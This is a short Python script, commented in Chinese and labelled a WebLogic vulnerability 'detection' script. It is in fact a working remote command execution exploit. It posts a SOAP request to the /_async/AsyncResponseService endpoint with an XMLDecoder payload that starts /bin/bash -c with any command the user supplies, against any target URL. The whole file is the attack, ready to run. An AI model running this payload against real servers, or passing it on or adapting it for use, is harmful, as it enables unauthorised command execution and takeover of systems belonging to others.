import requests
import sys
import argparse

# 定义命令行参数解析器
parser = argparse.ArgumentParser(description='Weblogic漏洞检测脚本')
parser.add_argument('-u', '--url', dest='url', type=str, required=True, help='目标URL')
parser.add_argument('-c', '--command', dest='command', type=str, default='whoami', help='执行的命令')

# 解析命令行参数
args = parser.parse_args()

# 定义 HTTP 请求头和数据
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299',
    'Content-Type': 'text/xml'
}
payload = f'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>{args.command}</string>
                        </void>
                    </array>
                    <void method="start"/>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>'''

# 发送 HTTP 请求
try:
    response = requests.post(url=args.url + '/_async/AsyncResponseService', headers=headers, data=payload, timeout=5)
    print(response.text)
except Exception as e:
    print(f'[-] 发生异常: {e}')
